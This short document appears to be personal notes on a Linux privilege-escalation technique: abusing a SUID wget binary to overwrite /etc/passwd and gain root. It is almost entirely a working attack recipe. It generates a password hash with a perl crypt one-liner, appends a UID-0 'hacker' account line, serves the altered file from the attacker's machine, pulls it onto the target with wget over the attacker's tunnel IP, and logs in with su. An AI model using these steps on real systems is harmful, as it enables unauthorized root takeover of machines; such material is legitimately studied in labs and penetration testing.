if wget is in the list of suid permissions you can do the following to get root:

on the target machine:
1.) cat /etc/passwd
2.) copy the contents of the targets /etc/passwd

on your machine:
1.) make a file and name it password
2.) paste the contents of the target machines /etc/passwd into your passwd file you just created
3.) save the file
4.) perl -le 'print crypt("pass123","abc123")'
5.) copy the ouput of the command above
6.) edit the file and add the following line on the bottom:
	- hacker:as2XksB4AwhxU:0:0:User_like_root:/root:/bin/bash
7.) save the passwd file
8.) use a python server or nc to transfer the file over to the target machine

back on the target machine:
1.) go into /etc
2.) wget http://yourtun0ip/passwd -O passwd
3.) make sure you dont get a permission denied error
4.) cat out passwd file and make sure that the user you created(in this case hacker) has been created
5.) if the user you created is shown in the passwd file on the target machine:
	- su hacker
	- (PASS): pass123
6.) You should now have root!!!
